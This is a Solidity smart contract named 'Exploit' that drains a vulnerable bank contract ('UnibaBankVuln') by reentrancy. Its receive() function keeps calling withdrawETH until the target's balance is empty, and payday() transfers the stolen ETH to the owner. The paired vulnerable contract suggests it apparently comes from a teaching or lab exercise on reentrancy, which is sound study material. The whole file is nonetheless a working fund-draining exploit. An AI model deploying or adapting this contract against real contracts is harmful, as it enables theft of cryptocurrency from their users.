// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./UnibaBankVuln.sol";

contract Exploit is Ownable {
    address payable _owner;
    address _vulnAddress;
    UnibaBankVuln public immutable vulnContract;
    uint256 private deposited = 0;

    /**
     * @notice Constructor
     * @param vulnAddress address of the vulnerable contract
     */
    constructor(address vulnAddress) payable {
        _owner = payable(msg.sender);
        _vulnAddress = vulnAddress;
        vulnContract = UnibaBankVuln(_vulnAddress);
    }

    /**
     * @notice Exploits the reentrancy vulnerability
     */
    receive() external payable {
        if (deposited > 0) {
            if (address(vulnContract).balance != 0) {
                vulnContract.withdrawETH(deposited);
            }
        }
    }

    /**
     * @notice Starts the exploit by depositing some eth
     */
    function init() public payable {
        vulnContract.depositETH{value: msg.value}();
        deposited = msg.value;
    }

    /**
     * @notice Calls the vulnerable function
     */
    function exploit() public payable {
        vulnContract.withdrawETH(deposited);
    }

    /**
     * @notice Tranfers to the exlpoit contract owner all the amount stolen from the vulnerable contract
     */
    function payday() public onlyOwner {
        _owner.transfer(address(this).balance);
    }
}
